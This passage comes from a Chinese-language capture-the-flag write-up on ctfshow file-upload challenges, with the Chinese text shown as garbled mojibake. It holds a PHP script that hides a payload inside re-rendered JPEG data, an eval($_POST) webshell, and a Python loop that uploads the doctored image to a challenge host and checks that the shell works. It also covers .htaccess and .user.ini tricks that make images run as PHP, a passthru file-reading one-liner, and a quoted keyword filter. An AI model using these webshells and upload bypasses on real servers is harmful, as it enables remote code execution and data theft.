                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
 
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

```bash
# ç”ŸæˆäºŒæ¬¡æ¸²æŸ“çš„jpgå›¾ç‰‡
php æ–‡ä»¶å.php æ–‡ä»¶å.jpg
```

![gen](/medias/show-upload/24.png)


```php
# æ¸²æŸ“åphpæœ¨é©¬å†…å®¹
<?=eval($_POST[1]);?>
```

å¦‚æœæ˜¯è‡ªå·±å‡†å¤‡çš„å›¾ç‰‡ï¼Œä¸Šä¼ åå¤§æ¦‚ä¼šå¤±è´¥

CTFshowç¾¤ä¸»æ¨èçš„äºŒæ¬¡æ¸²æŸ“ä¸“ç”¨å›¾
![jpg](/medias/show-upload/0.jpg)

æˆ‘å‡†å¤‡äº†ä¸€ä¸ªè„šæœ¬(æ¿€åŠ¨ï¼Œç»ˆäºæˆåŠŸäº†ï¼Œå¸ˆå‚…ä»¬ä¸€å®šè¦è¯•ä¸€è¯•ï¼ï¼ï¼)

```python
import requests
import random
import string

# é…ç½®
image_path = 'payload_cola1.jpg'  # å›¾ç‰‡è·¯å¾„
url = 'http://0092bb15-7d1d-4a6c-8f9d-c9ac4a6076fa.challenge.ctf.show/'
upload_url = url + 'upload.php'  # ä¸Šä¼ æ¥å£ URL
get_url = url + 'download.php?image='  # è®¿é—®æ¥å£
output_path = 'success_image1.jpg'  # ä¿å­˜è·¯å¾„

def generate_random_string(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

# è¯»å–å›¾ç‰‡æ–‡ä»¶
with open(image_path, 'rb') as image_file:
    image_data = image_file.read()

while True:
    # ç”Ÿæˆ30åˆ°50ä½é•¿åº¦çš„éšæœºå­—ç¬¦ä¸²
    random_length = random.randint(30, 50)
    text_to_append = generate_random_string(random_length).encode('utf-8')  # è¦è¿½åŠ çš„æ–‡æœ¬

    # è¿½åŠ æ–‡æœ¬åˆ°å›¾ç‰‡æ•°æ®
    modified_image_data = image_data + text_to_append
    # åœ¨å›¾ç‰‡æ•°æ®å¼€å¤´æ’å…¥æ–‡æœ¬ï¼ŒæŠ¥é”™
    # modified_image_data = text_to_append + image_data

    # å‡†å¤‡ä¸Šä¼ 
    files = {'file': ('modified_image.jpg', modified_image_data, 'image/jpeg')}
    response = requests.post(upload_url, files=files)
    # è·å–ä¸Šä¼ åçš„çŠ¶æ€ã€æ–‡ä»¶å
    response_json = response.json()
    msg = response_json.get("msg")

    # æ£€æŸ¥å“åº”
    if response.status_code == 200:
        print('ä¸Šä¼ æˆåŠŸ' + f"-----æ–‡ä»¶å {msg}")
        
        # æµ‹è¯•å›¾ç‰‡æ¥å£
        img_url = get_url + str(msg)
        test_resp = requests.get(img_url)
        if test_resp.status_code == 200:
            print("å›¾ç‰‡æµ‹è¯•æˆåŠŸ")
            data = {"1":"phpinfo();"}
            eval_resp = requests.post(img_url,data=data)
            if "phpinfo" in eval_resp.text:
                print("æœ¨é©¬å·²å­˜æ´»...")
                # åœ¨æˆåŠŸæ£€æµ‹åˆ°æœ¨é©¬æ–‡ä»¶åä¿å­˜ä¿®æ”¹åçš„æ–‡ä»¶
                with open(output_path, 'wb') as output_file:
                    output_file.write(modified_image_data)
                print(f'ä¿®æ”¹åçš„æ–‡ä»¶å·²ä¿å­˜åˆ°: {output_path}')
                break
            else:
                print("æ­£åœ¨ç”Ÿæˆæœ¨é©¬")
        else:
            print("å›¾ç‰‡ä¸Šä¼ å¤±è´¥ï¼Œè¯·æ£€æŸ¥å›¾ç‰‡")
    else:
        print(f'ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}')
        print(f'å“åº”å†…å®¹: {response.text}')

```
![res](/medias/show-upload/res1.png)

æ”¾3ç»„å›¾ï¼Œåˆ†åˆ«æ˜¯åŸå›¾ï¼Œä¸€æ¬¡æ¸²æŸ“å›¾ï¼Œä»¥åŠæˆæœå›¾

![åŸå›¾](/medias/show-upload/cola.jpg) 

![ä¸€æ¬¡æ¸²æŸ“å›¾](/medias/show-upload/payload_cola.jpg)

![æˆæœå›¾](/medias/show-upload/success_image.jpg)

å†è¯•ä¸€æ¬¡...
![res](/medias/show-upload/res2.png)

è·‘ä¸€ä¸‹æŸ´éƒ¡

åŸå›¾

![ori](/medias/show-upload/cj.jpg)

ä¸€æ¬¡æ¸²æŸ“

![one](/medias/show-upload/payload_cola1.jpg)

æˆæœå›¾

![two](/medias/show-upload/success_image1.jpg)

![res](/medias/show-upload/cjres.png)

:::warning
æ³¨æ„ï¼šæ­¤è„šæœ¬å¹¶æœªå®Œå–„ï¼Œå­˜åœ¨å·²çŸ¥bugï¼šå›¾ç‰‡æ¥å—è„šæœ¬å¤„ç†åå¯èƒ½æŸåï¼Œå› æ­¤ä¼šæ— æ•ˆæ­»å¾ªç¯
:::

## web 166 zipä¸Šä¼ 

æŸ¥çœ‹ç½‘é¡µæºç ï¼Œè¿™é¢˜éœ€è¦ä¸Šä¼ zipæ–‡ä»¶ï¼Œä¸Šä¼ ä¸€ä¸ªæ­£ç»çš„zipæ–‡ä»¶ï¼Œç‚¹ä¸‹è½½æ–‡ä»¶ï¼Œåˆ°äº†ç†Ÿæ‚‰çš„æ–‡ä»¶åŒ…å«ç•Œé¢

ç”¨notepad++åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ phpä»£ç ï¼Œç‚¹ä¸‹è½½æ–‡ä»¶ã€‚çœ‹åˆ°åŒ…å«çš„zipæ–‡ä»¶ä¸­çš„phpä»£ç æˆåŠŸè§£æäº†

![zip](/medias/show-upload/27.png)

## web 167 é˜¿å¸•å¥‡.htaccessé…ç½®æ–‡ä»¶

æ‰“å¼€ç½‘ç»œï¼Œå¯ä»¥çœ‹åˆ°ç½‘ç»œé‡Œæ˜¾ç¤ºçš„nginxï¼Œä¸Šä¼ ä¸€ä¸ªjpgå›¾ç‰‡ï¼Œè®¿é—®ï¼ŒæŠŠå›¾ç‰‡æ–‡ä»¶åæ”¹é”™ï¼ŒæŠ¥é”™æ˜¾ç¤ºapache

![net](/medias/show-upload/28.png)

å¤§ä½¬å›å¤ï¼šæœ‰å‰ç«¯ä»£ç†

å­¦ä¹ äº†

:::tip
ç½‘ç«™ä½¿ç”¨äº† Nginx ä½œä¸ºå‰ç«¯ä»£ç†ï¼Œåç«¯æœåŠ¡å™¨è¿è¡Œ Apacheã€‚è¿™ç§æ¶æ„ç§°ä¸ºâ€œåå‘ä»£ç†â€ï¼Œå®ƒå…è®¸ Nginx å¤„ç†æ‰€æœ‰ä¼ å…¥è¯·æ±‚å¹¶å°†å®ƒä»¬è½¬å‘åˆ°åç«¯çš„ Apache æœåŠ¡å™¨è¿›è¡Œå¤„ç†ã€‚

è¿™ç§æ¶æ„çš„ä¼˜åŠ¿åœ¨äºå¯ä»¥åˆ©ç”¨ Nginx å’Œ Apache å„è‡ªçš„ä¼˜åŠ¿æ¥æé«˜æ€§èƒ½å’Œçµæ´»æ€§ã€‚é€šè¿‡å‰ç«¯ä»£ç†ï¼ŒNginx å¯ä»¥æœ‰æ•ˆç®¡ç†è¯·æ±‚å’Œè´Ÿè½½ï¼Œè€Œ Apache ä¸“æ³¨äºå¤„ç†åŠ¨æ€å†…å®¹å’Œåº”ç”¨é€»è¾‘ã€‚
:::

åç«¯æ˜¯apacheåœ¨å¤„ç†ï¼Œè¿™é¢˜å°±å¯ä»¥å°è¯•ä½¿ç”¨é˜¿å¸•å¥‡çš„.htaccessé…ç½®æ–‡ä»¶æ¥æŠŠå½“å‰æ–‡ä»¶å¤¹çš„å…¶ä»–ç±»å‹æ–‡ä»¶ä½œä¸ºphpè§£æ

jpgä½œä¸ºphpè§£æ
```ini
AddType application/x-httpd-php .jpg
```

æ‰€ä»¥æ–‡ä»¶éƒ½ä½œä¸ºphpè§£æ
```ini
SetHandler application/x-http-php
```

æŠŠä»¥ä¸Šå†…å®¹å†™å…¥åˆ°.htacess.jpgæ–‡ä»¶ä¸­ï¼ŒbpæŠ“åŒ…ï¼ŒæŠŠ.jpgåˆ æ‰

åœ¨ä¸Šä¼ jpgå›¾ç‰‡é©¬å°±å¯ä»¥è§£æäº†

![jpg](/medias/show-upload/29.png)

## web 168 å…æ€

é¢˜ç›®æåˆ°äº†å…æ€ï¼Œåšå®Œæ—¶æŸ¥çœ‹æºç 

```php
preg_match('/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|include|require/i', $str);
```

æ³¨æ„ï¼Œå¦‚æœä¸Šä¼ æ²¡æœ‰ååº”ï¼Œæ£€æŸ¥ä¸€ä¸‹

:::warning
è¿‡æ»¤äº†å¾ˆå¤šã€‚å¦‚æœä½ ä¸Šä¼ çš„pngé©¬é‡Œå«æœ‰è¿™äº›å†…å®¹ï¼Œä½ çš„å›¾ç‰‡éƒ½ä¸ä¼šä¸Šä¼ æˆåŠŸ
:::

è¿™é¢˜æ²¡æœ‰å…¶ä»–é™åˆ¶ï¼Œå¯ä»¥bpæŠ“åŒ…æŠŠpngæ”¹æˆphpç›´æ¥è§£æ

æ–‡ä»¶ä¸Šä¼ åˆ°äº†htmlçš„åŒçº§ç›®å½•uploadä¸‹äº†ï¼ŒæŸ¥çœ‹ä¸Šä¸€çº§ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å†…å®¹

```php
<?=passthru('tac ../*');?>
```

## web 169 é«˜çº§å…æ€

æºç é‡Œçœ‹åˆ°ï¼Œè¿™é¢˜è¦ä¸Šä¼ zipæ–‡ä»¶ï¼Œä½†content-typeçœ‹èµ·æ¥æ˜¯è¦image

![image](/medias/show-upload/30.png)

é¢˜ç›®æ²¡æœ‰æ£€æŸ¥zipæœ‰æ²¡æœ‰çŒ«è…»ï¼Œç›´æ¥æŠŠzipå†…å®¹æ”¹æˆphpä»£ç è¯•è¯•ï¼Œä¸Šä¼ zipï¼ŒæŠŠcontent-typeæ”¹æˆimage/png

```php
<?=phpinfo();?>
```

![php](/medias/show-upload/31.png)

æŠŠphpä»£ç åˆ æ‰ã€‚åªç•™æ ‡è®°ä¹Ÿä¼šä¸Šä¼ å¤±è´¥ï¼Œè¿™ä¸ªphpæ–‡ä»¶æ²¡çš„ç©äº†

![php](/medias/show-upload/33.png)

ç©ºçš„phpæ–‡ä»¶è¿˜èƒ½ä¸Šä¼ ï¼Œç¡®å®æŒºä¸é”™çš„

![php](/medias/show-upload/34.png)

è¿˜å¯ä»¥è¯•è¯•.user.iniæ–‡ä»¶åŒ…å«ï¼ŒæŠŠæ—¥å¿—åŒ…å«åˆ°1.phpé‡Œ

```zip
auto_prepend_file=/var/log/nginx/access.log
```

![ini](/medias/show-upload/32.png)

ä¸Šä¼ æˆåŠŸï¼Œ.user.iniåœ¨uploadç›®å½•ä¸‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿè¦åˆ°uploadç›®å½•ä¸‹çš„phpé¡µé¢

![log](/medias/show-upload/35.png)

## web 170 ç»ˆæå…æ€

ä¸Šä¸€å…³æ–¹æ³•ä»ç„¶é€‚ç”¨